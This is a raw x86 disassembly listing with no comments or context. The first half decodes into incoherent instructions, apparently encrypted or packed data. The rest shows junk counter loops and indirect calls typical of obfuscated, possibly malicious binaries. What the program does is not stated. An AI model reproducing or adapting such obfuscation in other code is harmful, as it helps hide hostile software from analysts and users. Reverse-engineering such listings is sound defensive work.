  4048cc:	adc    BYTE PTR [eax-0x7b],al
  4048cf:	xchg   ecx,eax
  4048d0:	inc    BYTE PTR [ecx+0x52caf696]
  4048d6:	pushf  
  4048d7:	sub    DWORD PTR [ecx+0x57a42b6f],0x4a
  4048de:	add    DWORD PTR [edx+0x160546e9],ebp
  4048e4:	dec    edx
  4048e5:	adc    al,0x93
  4048e7:	(bad)  
  4048e8:	jb     0x404903
  4048ea:	fisttp DWORD PTR [esi+0x1fa68734]
  4048f0:	es sbb eax,0xf6a6ffd3
  4048f6:	dec    ebx
  4048f7:	mov    ah,0xa3
  4048f9:	test   eax,0xba59af10
  4048fe:	sub    ebp,ebp
  404900:	div    ah
  404902:	ret    0x71aa
  404905:	push   ecx
  404906:	push   0x5615a3a1
  40490b:	ss dec ebx
  40490d:	mov    al,0x70
  40490f:	cld    
  404910:	adc    bh,BYTE PTR [esi]
  404912:	cld    
  404913:	push   edi
  404914:	and    eax,0xbda50e59
  404919:	inc    ebp
  40491a:	stos   BYTE PTR es:[edi],al
  40491b:	cmp    DWORD PTR [ecx+eiz*8],esi
  40491e:	jmp    0xf9c6:0xe30333b6
  404925:	push   ebx
  404926:	inc    esi
  404927:	clc    
  404928:	js     0x404961
  40492a:	cmp    dh,BYTE PTR [eax-0x6]
  40492d:	xchg   ebx,eax
  40492e:	das    
  40492f:	cli    
  404930:	inc    esi
  404931:	imul   ebp,DWORD PTR [ebp+0x6929ca22],0x8046474
  40493b:	mov    ds:0x74dcad63,al
  404940:	scas   eax,DWORD PTR es:[edi]
  404941:	xchg   esp,eax
  404942:	call   0xfe89:0xd5a09c96
  404949:	test   DWORD PTR [ebx+eax*4+0x69],esp
  40494d:	mov    al,0xde
  40494f:	and    al,0x53
  404951:	loope  0x4048f0
  404953:	inc    esp
  404954:	add    ebp,ebx
  404956:	push   eax
  404957:	and    al,0x85
  404959:	lods   al,BYTE PTR ds:[esi]
  40495a:	pop    edx
  40495b:	mov    edi,DWORD PTR fs:[ecx+0x58000a17]
  404962:	in     al,dx
  404963:	pop    es
  404964:	(bad)  
  404965:	lods   al,BYTE PTR ds:[esi]
  404966:	cmp    DWORD PTR [eax+0x3a],eax
  404969:	nop
  40496a:	inc    eax
  40496b:	cs pop edx
  40496d:	(bad)  
  40496f:	dec    eax
  404970:	imul   esp,esp,0x1
  404973:	cmp    ebp,DWORD PTR [edi+0x44]
  404976:	scas   eax,DWORD PTR es:[edi]
  404977:	mov    al,0x3c
  404979:	pop    ds
  40497a:	sub    ebx,esi
  40497c:	cli    
  40497d:	(bad)  
  40497e:	iret   
  40497f:	test   DWORD PTR es:[esi-0x39],ebp
  404983:	or     al,0x59
  404985:	leave  
  404986:	push   ebp
  404987:	rcl    BYTE PTR [edx],cl
  404989:	pop    esp
  40498a:	inc    eax
  40498b:	and    al,0x5e
  40498d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40498e:	add    DWORD PTR [edx],esp
  404990:	stos   DWORD PTR es:[edi],eax
  404991:	jmp    0x18db:0xf023a008
  404998:	push   ds
  404999:	daa    
  40499a:	cmp    dh,BYTE PTR [ecx+ecx*8]
  40499d:	das    
  40499e:	das    
  40499f:	and    al,0x8d
  4049a1:	js     0x40496d
  4049a3:	inc    eax
  4049a4:	loopne 0x404962
  4049a6:	nop
  4049a7:	xchg   ebx,eax
  4049a8:	daa    
  4049a9:	loope  0x4049aa
  4049ab:	js     0x4049ef
  4049ad:	push   ecx
  4049ae:	mov    eax,ds:0x86124bab
  4049b3:	inc    edi
  4049b4:	jne    0x4049a9
  4049b6:	enter  0xa57e,0x0
  4049ba:	and    eax,0x4df8d94c
  4049bf:	pop    DWORD PTR [edi+0x118750e9]
  4049c5:	push   esi
  4049c6:	mov    bh,BYTE PTR [eax-0x61d99dd1]
  4049cc:	cmp    DWORD PTR [ebp+0x29c20ab9],ebp
  4049d2:	or     DWORD PTR [esi-0x62],ebx
  4049d5:	pop    es
  4049d6:	inc    esi
  4049d7:	sbb    cl,al
  4049d9:	or     DWORD PTR [eax+0x6],ecx
  4049dc:	mov    bl,0x76
  4049de:	popf   
  4049df:	fild   QWORD PTR [eax+edx*8+0x4eb9713]
  4049e6:	outs   dx,DWORD PTR ds:[esi]
  4049e7:	cld    
  4049e8:	inc    edi
  4049e9:	outs   dx,BYTE PTR ds:[esi]
  4049ea:	outs   dx,DWORD PTR ds:[esi]
  4049eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049ec:	mov    ebp,0x4de260ff
  4049f1:	mov    BYTE PTR [edx+0x70d23605],bl
  4049f7:	xchg   edi,eax
  4049f8:	pop    ecx
  4049f9:	cmpxchg DWORD PTR ds:[eax+0x2b],edx
  4049fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049ff:	sar    dl,cl
  404a01:	mov    esp,0x4daf1213
  404a06:	cli    
  404a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a08:	jb     0x4049ea
  404a0a:	and    eax,esi
  404a0c:	(bad)  
  404a0e:	xchg   ebp,eax
  404a0f:	nop
  404a10:	fadd   QWORD PTR [ecx+0x3ee53470]
  404a16:	loope  0x4049a7
  404a18:	jecxz  0x4049ab
  404a1a:	out    dx,al
  404a1b:	jl     0x404a87
  404a1d:	aad    0x4e
  404a1f:	test   eax,0x9bac73a0
  404a24:	in     al,0x5e
  404a26:	cld    
  404a27:	rol    BYTE PTR [edx+0x4e],cl
  404a2a:	fucomp st(7)
  404a2c:	sub    DWORD PTR [edx+ebx*4-0x87686d0],0x4228b220
  404a37:	push   0xffffffaf
  404a39:	ror    ch,cl
  404a3b:	out    dx,al
  404a3c:	neg    DWORD PTR [eax+0x11]
  404a3f:	daa    
  404a40:	lds    edx,FWORD PTR [eax]
  404a42:	push   edi
  404a43:	mov    ecx,0xe3cc5732
  404a48:	dec    esi
  404a49:	xchg   esp,ebx
  404a4b:	inc    edx
  404a4c:	test   BYTE PTR [edi+edx*2+0x649d08a2],0xc
  404a54:	and    ah,BYTE PTR [ebp+0x65]
  404a57:	add    edi,esp
  404a59:	xor    DWORD PTR [eax+0x61],eax
  404a5c:	ror    ecx,cl
  404a5e:	scas   eax,DWORD PTR es:[edi]
  404a5f:	sbb    BYTE PTR [ecx-0x1b],ch
  404a62:	mov    ah,BYTE PTR [eax]
  404a64:	mov    ecx,ebp
  404a66:	pop    edi
  404a67:	mov    cl,0x7e
  404a69:	xchg   ecx,eax
  404a6a:	jnp    0x404aa3
  404a6c:	dec    esp
  404a6d:	mov    ebx,0x162419df
  404a72:	pop    es
  404a73:	addr16 mov dh,0xcf
  404a76:	adc    al,dl
  404a78:	fwait
  404a79:	jns    0x404ad2
  404a7b:	push   ss
  404a7c:	mov    dl,dl
  404a7e:	inc    ebx
  404a7f:	jns    0x404ad2
  404a81:	xchg   edx,eax
  404a82:	jne    0x404ada
  404a84:	mov    edi,0x1f0d9cd9
  404a89:	fs mov ah,0xcd
  404a8c:	mov    al,0x7e
  404a8e:	outs   dx,BYTE PTR ds:[esi]
  404a8f:	push   ebp
  404a90:	leave  
  404a91:	mov    al,ds:0xce33e304
  404a96:	and    al,0x4f
  404a98:	push   cs
  404a99:	or     al,BYTE PTR [edx+0x2e]
  404a9c:	mov    edi,0x977080bc
  404aa1:	mov    eax,ds:0xfee55094
  404aa6:	mov    edi,0x8ef65ee
  404aab:	fiadd  DWORD PTR [esi-0x7430aeca]
  404ab1:	dec    BYTE PTR [edx]
  404ab3:	adc    esp,DWORD PTR [eax+0x7a2efe4f]
  404ab9:	lods   al,BYTE PTR ds:[esi]
  404aba:	add    al,0x8e
  404abc:	sub    eax,0x4a836154
  404ac1:	push   0xffffffab
  404ac3:	and    al,0xb7
  404ac5:	pop    esp
  404ac6:	add    ebp,ecx
  404ac8:	sub    BYTE PTR [ecx+0x7a],cl
  404acb:	push   esp
  404acc:	xor    edx,DWORD PTR [eax-0x491e6732]
  404ad2:	ror    BYTE PTR [ecx+0x3a],cl
  404ad5:	xor    edx,DWORD PTR [esi-0x7131610a]
  404adb:	mov    ebp,0x83a9a94e
  404ae0:	sub    BYTE PTR [ecx+0x5226ac53],ah
  404ae6:	pop    edi
  404ae7:	inc    eax
  404ae8:	enter  0xbddc,0x2d
  404aec:	inc    esi
  404aed:	add    eax,0xc1be4210
  404af2:	sbb    ebx,DWORD PTR [ebx+ebx*4-0x17]
  404af6:	xchg   esp,eax
  404af7:	and    ebx,DWORD PTR [esi+esi*1+0x432b43cc]
  404afe:	retf   
  404aff:	fiadd  DWORD PTR [ebp-0x1c]
  404b02:	loopne 0x404aa1
  404b04:	xor    DWORD PTR [ebx+eax*4],edx
  404b07:	sbb    BYTE PTR [eax-0x56],ch
  404b0a:	pop    edi
  404b0b:	mov    ebp,0x38612d15
  404b10:	int3   
  404b11:	bound  ebx,QWORD PTR [eax+0x41]
  404b14:	outs   dx,DWORD PTR ds:[esi]
  404b15:	sbb    eax,0x1712c620
  404b1a:	xor    al,BYTE PTR ds:0x1de98ad
  404b20:	cmp    DWORD PTR [ebx+0x3de8b496],ecx
  404b26:	and    DWORD PTR [esi],0xffffffe6
  404b29:	inc    edi
  404b2a:	pop    edx
  404b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b2c:	or     ch,BYTE PTR [edi-0x755f3d38]
  404b32:	or     ah,BYTE PTR [esi-0x1b05e9dd]
  404b38:	pop    ebx
  404b39:	shr    DWORD PTR [edi],0x16
  404b3c:	leave  
  404b3d:	sbb    eax,0x74dc47c
  404b42:	les    ebp,FWORD PTR [esi-0x6c4f89d9]
  404b48:	dec    eax
  404b49:	fmul   QWORD PTR [eax-0x56]
  404b4c:	or     al,BYTE PTR [ebp+ebx*1-0x19657f8]
  404b53:	leave  
  404b54:	inc    edx
  404b55:	dec    eax
  404b56:	leave  
  404b57:	outs   dx,BYTE PTR ds:[esi]
  404b58:	mov    dh,0xc
  404b5a:	retf   0x7973
  404b5d:	jl     0x404b30
  404b5f:	jns    0x404bd9
  404b61:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  404b63:	mov    WORD PTR [ebx-0x51],cs
  404b66:	or     DWORD PTR [esi],0x9c3a5e6
  404b6c:	xchg   ebx,eax
  404b6d:	push   edx
  404b6e:	arpl   WORD PTR [ecx],cx
  404b70:	es pushf 
  404b72:	loopne 0x404afa
  404b74:	faddp  st(2),st
  404b76:	dec    esp
  404b77:	fs out 0xa8,eax
  404b7a:	dec    ecx
  404b7b:	sbb    eax,0xb76d07ec
  404b80:	add    ebx,esi
  404b82:	jge    0x404be4
  404b84:	iret   
  404b85:	push   ebx
  404b86:	or     edi,edi
  404b88:	loopne 0x404b1a
  404b8a:	mov    ah,0x3f
  404b8c:	sti    
  404b8d:	in     eax,0x6f
  404b8f:	dec    edi
  404b90:	leave  
  404b91:	add    bh,BYTE PTR [ebx-0x1a]
  404b94:	jno    0x404bbd
  404b96:	xor    al,0xa7
  404b98:	jnp    0x404b62
  404b9a:	int3   
  404b9b:	test   al,0x4e
  404b9d:	push   0x30
  404b9f:	in     eax,0x76
  404ba1:	lds    ebx,FWORD PTR [eax+ecx*8]
  404ba4:	xor    DWORD PTR gs:[ebx],ebp
  404ba7:	mov    ds:0x730f4f24,al
  404bac:	ret    
  404bad:	sbb    edi,eax
  404baf:	cmp    DWORD PTR [ebp+eiz*8+0x313f2777],ebx
  404bb6:	sbb    DWORD PTR [ebx-0x552cefd2],esi
  404bbc:	jnp    0x404b6c
  404bbe:	stc    
  404bbf:	cmp    al,0x9a
  404bc1:	loopne 0x404b53
  404bc3:	les    ebx,FWORD PTR [edx-0x25967eee]
  404bc9:	sub    eax,0x3f0aba95
  404bce:	pushf  
  404bcf:	in     eax,0xf1
  404bd1:	or     al,0x6c
  404bd3:	fwait
  404bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bd5:	xchg   BYTE PTR [ecx-0x6aeb5c17],dh
  404bdb:	mov    cl,0x7b
  404bdd:	into   
  404bde:	inc    edi
  404bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404be0:	mov    ds:0x67b7e268,eax
  404be5:	jecxz  0x404bf8
  404be7:	icebp  
  404be8:	xor    eax,0x113c9e2
  404bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bee:	add    esi,edi
  404bf0:	das    
  404bf1:	inc    ebp
  404bf2:	sahf   
  404bf3:	jno    0x404b9c
  404bf5:	or     eax,ebp
  404bf7:	pop    edi
  404bf8:	loope  0x404c13
  404bfa:	aas    
  404bfb:	outs   dx,DWORD PTR ds:[esi]
  404bfc:	mov    ah,0x56
  404bfe:	fiadd  DWORD PTR [eax+0x9556a5f]
  404c04:	cmp    edx,DWORD PTR [edx+ebp*4-0x13]
  404c08:	jne    0x404b94
  404c0a:	adc    ebx,edi
  404c0c:	jmp    0x404c18
  404c0e:	aas    
  404c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c10:	push   0x957a56a3
  404c15:	xchg   edi,eax
  404c16:	push   es
  404c17:	(bad)  
  404c18:	aam    0xa2
  404c1a:	cmp    BYTE PTR [edi+0x69],0xa5
  404c1e:	pop    edx
  404c1f:	jnp    0x404c34
  404c21:	jae    0x404bfe
  404c23:	mov    dl,0x9f
  404c25:	(bad)  
  404c26:	in     eax,dx
  404c27:	jecxz  0x404c42
  404c29:	cdq    
  404c2a:	mov    WORD PTR [ebp+0x64f91a70],fs
  404c30:	push   eax
  404c31:	mov    edi,0x894e482e
  404c36:	xchg   esp,eax
  404c37:	push   0xffffff96
  404c39:	mov    ecx,ebp
  404c3b:	mov    ebp,esp
  404c3d:	sbb    ah,0xd8
  404c40:	jge    0x404c64
  404c42:	mov    ah,0x85
  404c44:	mov    ebx,0xffd89aaa
  404c49:	into   
  404c4a:	cmp    BYTE PTR [edx-0x6a60c51],ch
  404c50:	mov    al,ds:0x4f73542
  404c55:	out    0xed,al
  404c57:	out    dx,al
  404c58:	test   al,0xb3
  404c5a:	jb     0x404cb5
  404c5c:	loop   0x404cac
  404c5e:	les    edi,FWORD PTR [ebx-0xab68111]
  404c64:	(bad)  
  404c65:	in     al,0xd6
  404c67:	xor    DWORD PTR [edx+0x8],ecx
  404c6a:	int3   
  404c6b:	adc    DWORD PTR [esp+edi*8],ebp
  404c6e:	mov    cl,dl
  404c70:	stc    
  404c71:	arpl   WORD PTR [ecx+eax*1-0xa],ax
  404c75:	ins    BYTE PTR es:[edi],dx
  404c76:	mov    ebp,0xbcb4a517
  404c7b:	add    esi,DWORD PTR [edi-0x5343d5b3]
  404c81:	stos   DWORD PTR es:[edi],eax
  404c82:	addr16 xchg ecx,eax
  404c84:	mov    ds:0x883343fb,eax
  404c89:	ins    BYTE PTR es:[edi],dx
  404c8a:	pop    esp
  404c8b:	imul   esi,esp,0x111e5644
  404c91:	xor    al,0xe5
  404c93:	inc    esi
  404c94:	loope  0x404d0e
  404c96:	xor    al,0x58
  404c98:	mov    edi,0xaf8edf2f
  404c9d:	sbb    bl,BYTE PTR [esi-0x16]
  404ca0:	dec    ecx
  404ca1:	push   0xfbb02b8b
  404ca6:	pushf  
  404ca7:	cmp    BYTE PTR [ebx+edx*1+0x1c],bh
  404cab:	(bad)  [ecx+0x1c]
  404cae:	sti    
  404caf:	inc    ecx
  404cb0:	loope  0x404ca5
  404cb2:	xchg   ebp,eax
  404cb3:	and    DWORD PTR [ecx],edx
  404cb5:	aaa    
  404cb6:	pushf  
  404cb7:	std    
  404cb8:	(bad)  
  404cb9:	(bad)  
  404cba:	and    BYTE PTR [ecx],dh
  404cbc:	jg     0x404d20
  404cbe:	or     BYTE PTR [edi+0x64a8060f],0x21
  404cc5:	push   ebx
  404cc6:	xchg   ecx,eax
  404cc7:	stos   DWORD PTR es:[edi],eax
  404cc8:	xor    BYTE PTR [ebx],dh
  404cca:	xor    DWORD PTR [eax],0x5a
  404ccd:	sbb    DWORD PTR [eax],esi
  404ccf:	or     dh,BYTE PTR [ebx-0x3c]
  404cd2:	xor    DWORD PTR [ebp-0x40d8ce06],ebx
  404cd8:	pop    ebx
  404cd9:	repnz (bad) 
  404cdc:	pop    ebx
  404cdd:	cmp    ah,al
  404cdf:	push   es
  404ce0:	mov    ebp,fs
  404ce2:	or     eax,0xb7a250bb
  404ce7:	ss jns 0x404d55
  404cea:	sub    ah,BYTE PTR [edi-0x77b09edb]
  404cf0:	ficom  WORD PTR [edx]
  404cf2:	lods   al,BYTE PTR ds:[esi]
  404cf3:	adc    eax,0xd48920
  404cf8:	ja     0x404c9c
  404cfa:	push   ds
  404cfb:	int3   
  404cfc:	xor    bl,dl
  404cfe:	in     eax,dx
  404cff:	std    
  404d00:	cli    
  404d01:	repnz shr BYTE PTR [edi-0x2],cl
  404d05:	jb     0x404d21
  404d07:	popa   
  404d08:	aad    0xdf
  404d0a:	or     DWORD PTR [ecx+0x30ac5f18],ebp
  404d10:	jne    0x404d30
  404d12:	sbb    dl,BYTE PTR [esi*1+0x4f6be832]
  404d19:	pop    eax
  404d1a:	jbe    0x404d21
  404d1c:	sahf   
  404d1d:	and    eax,0x3b8e1403
  404d22:	test   al,0x93
  404d24:	lea    ebx,ds:0x442b01a9
  404d2a:	jno    0x404da4
  404d2c:	lods   al,BYTE PTR ds:[esi]
  404d2d:	inc    ebx
  404d2e:	nop
  404d2f:	bound  esp,QWORD PTR [eax+0x5d7a37ab]
  404d35:	push   0xa820b627
  404d3a:	ret    0xf6ec
  404d3d:	shl    eax,cl
  404d3f:	xchg   ebx,eax
  404d40:	mov    ecx,0x5d2bfe00
  404d45:	mov    eax,ds:0x617e6027
  404d4a:	dec    edx
  404d4b:	out    0x28,al
  404d4d:	shl    esi,0xd1
  404d50:	sub    esi,DWORD PTR [edi]
  404d52:	imul   DWORD PTR [edi+0x72]
  404d55:	inc    edx
  404d56:	push   esi
  404d57:	and    ebx,0x8d924847
  404d5d:	lods   eax,DWORD PTR ds:[esi]
  404d5e:	fucomp st(1)
  404d60:	or     eax,0xc4bcc2aa
  404d65:	mov    bh,BYTE PTR [edi]
  404d67:	mov    cl,0x8b
  404d69:	lods   al,BYTE PTR ds:[esi]
  404d6a:	mov    cl,0xe2
  404d6c:	push   eax
  404d6d:	jae    0x404d8d
  404d6f:	fiadd  DWORD PTR [ecx]
  404d71:	loop   0x404d8d
  404d73:	xor    BYTE PTR [eax],0xa1
  404d76:	rol    BYTE PTR [esi+0x327ceae1],0xd6
  404d7d:	inc    ebx
  404d7e:	arpl   WORD PTR [edi-0x18],bp
  404d81:	imul   eax,DWORD PTR [edx*4+0x560990b0],0x89352049
  404d8c:	push   es
  404d8d:	pop    edx
  404d8e:	sbb    BYTE PTR [edi-0x5c],ch
  404d91:	out    dx,al
  404d92:	mov    al,ds:0xa31183bd
  404d97:	sub    DWORD PTR [ebx],0x60
  404d9a:	dec    edx
  404d9b:	and    edx,DWORD PTR [eax-0x3b8d4d05]
  404da1:	and    ah,bl
  404da3:	or     bl,BYTE PTR [ebx]
  404da5:	mov    ch,0x50
  404da7:	int    0x81
  404da9:	ret    0x324f
  404dac:	(bad)  
  404dad:	ja     0x404d96
  404daf:	add    BYTE PTR [esi+eax*1+0x2166d99c],0xdf
  404db7:	out    0x75,eax
  404db9:	and    DWORD PTR ds:0x42075b9,edx
  404dbf:	xchg   ebx,eax
  404dc0:	(bad)  
  404dc1:	xchg   ebp,eax
  404dc2:	es scas al,BYTE PTR es:[edi]
  404dc4:	inc    ebx
  404dc5:	(bad)  
  404dc6:	imul   ah
  404dc8:	adc    al,0x4f
  404dca:	push   0x4c
  404dcc:	pop    esp
  404dcd:	pop    ds
  404dce:	sub    BYTE PTR [edi],dh
  404dd0:	push   ds
  404dd1:	push   es
  404dd2:	mov    edx,0xec6f45
  404dd7:	jmp    0x404d65
  404dd9:	jnp    0x404df9
  404ddb:	mov    bh,0x8
  404ddd:	ror    DWORD PTR [ebx-0x42bb8563],cl
  404de3:	mov    dl,0x46
  404de5:	nop
  404de6:	es pop ecx
  404de8:	sub    al,al
  404dea:	xor    DWORD PTR [edi-0x2b345aa3],ecx
  404df0:	pop    ebx
  404df1:	repnz (bad) 
  404df3:	mov    dh,0x1a
  404df5:	inc    ebx
  404df6:	mov    cl,0x1c
  404df8:	je     0x404ed6
  404dfe:	and    eax,DWORD PTR ds:0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
